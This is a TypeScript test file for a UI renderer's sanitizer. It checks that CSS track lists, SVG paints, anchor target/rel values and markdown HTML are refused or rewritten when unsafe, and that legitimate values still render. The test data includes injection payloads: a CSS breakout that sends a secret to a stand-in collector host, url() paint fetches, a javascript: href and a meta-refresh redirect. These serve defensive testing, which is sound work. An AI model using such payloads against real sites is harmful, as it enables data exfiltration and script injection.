// ============================================================================
//  The emission grammar for string-typed slots, in EMITTED BYTES.
//
//  A handful of wire slots are typed `string` and carry a grammar the type does
//  not state — a CSS track-list (`grid.templateColumns`), an SVG paint
//  (`drawStyle.fill` / `.stroke`), and the two anchor token slots
//  (`link.target` / `link.rel`). Four server renderers concatenated
//  `templateColumns` into `style="grid-template-columns:…"` with no rule at
//  all, so `"1fr;background:url(https://collector/?d=…)"` closed the
//  declaration, opened a second one the document never wrote, and fetched on
//  RENDER with no user act, outside the egress policy that governs every href
//  and src in the same document — while this renderer assigned a style OBJECT
//  and the browser dropped the identical value silently.
//
//  So the property under test here is NOT "the client was vulnerable". It is
//  that the client refuses what the servers refuse, VISIBLY, in the same way: a
//  refusal present on one host and absent on another is a refusal no reader can
//  rely on, and a marker missing from exactly the document a reader is looking
//  at is worse than no marker at all.
//
//  Two disciplines, mirroring the sibling hosts' corpora:
//
//   1. Every refusal test has an ALLOW twin. A gate that refuses everything
//      passes every refusal assertion ever written. The allow twins go red if
//      the grammar is tightened past what a legitimate document says — which is
//      why the named colour is among them.
//   2. The rendered bytes, through the ordinary entry point. A test calling
//      `sanitizeCssValue` directly would keep passing on the day someone
//      removed the call from the grid arm.
// ============================================================================

import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';

import { decodeNode } from '@fuaran-ui/ops';

import { FuaranRenderer, permissiveEgress } from '../src/index.js';
import {
  cssRefusalAttribute,
  isSafeCssValue,
  sanitizeCssValue,
  sanitizeLinkAnchor,
  sanitizeMarkdownHtml,
  sanitizePaintValue,
} from '../src/sanitize.js';

/**
 * Render under a permissive EGRESS policy, for the reason the corpus test gives
 * for the same choice: the ambient default-deny has its own dedicated corpus,
 * and leaving it on here would mean a CSS-grammar regression and an egress
 * change produced the same failure output. A corpus that cannot say which of
 * two things broke is worth much less than two that can.
 */
const render = (wire: string): string => {
  const decoded = decodeNode(wire);
  if (!decoded.ok) throw new Error(`decode failed: ${JSON.stringify(decoded.error)}`);
  return renderToStaticMarkup(<FuaranRenderer tree={decoded.value} egressPolicy={permissiveEgress} />);
};

const grid = (template?: string): string =>
  JSON.stringify({
    id: 'g',
    kind: {
      $type: 'Box',
      children: [],
      layout: { $type: 'Grid', cols: 2, ...(template !== undefined ? { templateColumns: template } : {}) },
      role: 'Group',
    },
  });

const painted = (fill: string): string =>
  JSON.stringify({
    id: 'd',
    kind: {
      $type: 'Drawing',
      shapes: [{ $type: 'Circle', cx: 5, cy: 5, r: 2, style: { fill: { $type: 'Static', value: fill } } }],
      style: {},
      viewBox: { height: 10, minX: 0, minY: 0, width: 10 },
    },
  });

const link = (target?: string, rel?: string): string =>
  JSON.stringify({
    id: 'l',
    kind: {
      $type: 'Link',
      download: false,
      href: { $type: 'Static', value: '/about' },
      label: 'About',
      ...(rel !== undefined ? { rel } : {}),
      ...(target !== undefined ? { target } : {}),
    },
  });

describe('emission grammar — CSS track-list', () => {
  it('refuses a value that leaves its declaration, and MARKS the refusal', () => {
    const html = render(grid('1fr;background:url(https://collector.example/?d=SECRET)'));
    expect(html).not.toContain('collector.example');
    expect(html).not.toContain('SECRET');
    // The marker carries the SLOT and never the value: a refused value is the
    // payload.
    expect(html).toContain(`${cssRefusalAttribute}="grid-template-columns"`);
  });

  it('ALLOW twin — real track lists render verbatim and unmarked', () => {
    for (const template of ['1fr 2fr auto', 'repeat(auto-fit, minmax(150px, 1fr))', 'min-content max-content']) {
      const html = render(grid(template));
      expect(html).toContain(template);
      expect(html).not.toContain(cssRefusalAttribute);
    }
  });

  it('a grid declaring no template is unchanged from before the gate', () => {
    const html = render(grid());
    expect(html).toContain('repeat(2, 1fr)');
    expect(html).not.toContain(cssRefusalAttribute);
  });
});

describe('emission grammar — SVG paint', () => {
  it('refuses a paint-server reference to `none`', () => {
    // `url(https://collector/x)` contains no forbidden CHARACTER, so it passes
    // the generic CSS rule. In an SVG `fill` it names a paint server the user
    // agent FETCHES. Only a positive grammar excludes it.
    const html = render(painted('url(https://collector.example/x)'));
    expect(html).not.toContain('collector.example');
    // `none` rather than empty: an empty `fill` INHERITS the enclosing group's
    // paint instead of clearing it.
    expect(html).toContain('fill="none"');
  });

  it('ALLOW twin — hex, a NAMED colour and a colour function all survive', () => {
    // The named colour is the load-bearing one. An enumerated keyword list
    // refuses `steelblue`, and its failure mode is silent: the shape is
    // repainted, not reported.
    for (const paint of ['#39c', '#336699', 'steelblue', 'currentColor', 'rgb(1 2 3)']) {
      expect(render(painted(paint))).toContain(`fill="${paint}"`);
    }
  });
});

describe('emission grammar — anchor token slots', () => {
  it('drops `rel=opener` on a `_blank` link and FORCES the safe pair', () => {
    // `opener` re-enables `window.opener` on a `_blank` link, handing the opened
    // document a live reference to this one — and browsers imply `noopener`
    // there, which is exactly why an explicit `opener` mattered: it OVERRIDES a
    // user-agent default no document can know the version floor of.
    const html = render(link('_blank', 'opener'));
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('target="_blank"');
  });

  it('OMITS a target outside the closed set rather than substituting one', () => {
    for (const target of ['victim', '_parent', '_top']) {
      const html = render(link(target));
      expect(html).not.toContain('target=');
      expect(html).not.toContain(target);
    }
  });

  it('ALLOW twin — `_self` with a descriptive rel forces nothing', () => {
    const html = render(link('_self', 'nofollow'));
    expect(html).toContain('target="_self"');
    expect(html).toContain('rel="nofollow"');
    expect(html).not.toContain('noopener');

    const bare = render(link());
    expect(bare).not.toContain('rel=');
    expect(bare).not.toContain('target=');
  });
});

describe('emission grammar — the markdown sweep', () => {
  it('anchors the protocol rewrite to tag interiors, so prose survives', () => {
    // Unanchored, the sweep rewrote VISIBLE PROSE: a document explaining the
    // hazard could not state it, because the literal token in a `<code>`
    // element's TEXT was replaced with `about:blank`.
    expect(sanitizeMarkdownHtml('<p>Never write <code>javascript:</code> in an href</p>')).toContain(
      'javascript:',
    );
    const attr = sanitizeMarkdownHtml('<a href="javascript:alert(1)">x</a>');
    expect(attr).not.toContain('javascript:');
    expect(attr).toContain('about:blank');
  });

  it('matches an element NAME, not a prefix of one', () => {
    // `<metadata>` is not `<meta>` and `<linearGradient>` is not `<link>`, both
    // of which the drawing builder emits.
    expect(sanitizeMarkdownHtml('<p><meter value="0.6"></meter></p>')).toContain('<meter');
    expect(sanitizeMarkdownHtml('<meta http-equiv="refresh" content="0;url=http://evil">')).not.toContain(
      'evil',
    );
  });
});

describe('emission grammar — the go-red self-test', () => {
  it('refuses and admits the right things', () => {
    // Without this, a bug that made every CSS value empty for an unrelated
    // reason would read above as a gate working.
    expect(isSafeCssValue('1fr;background:url(x)')).toBe(false);
    expect(isSafeCssValue('clamp(1rem, 2vw, 3rem)')).toBe(true);
    expect(isSafeCssValue('URL\n(x)')).toBe(false);
    expect(sanitizeCssValue('a}b{color:red')).toBe('');
    expect(sanitizePaintValue('url(#grad)')).toBe('none');
    expect(sanitizeLinkAnchor('_blank', undefined)).toEqual(['_blank', 'noopener noreferrer']);
  });
});
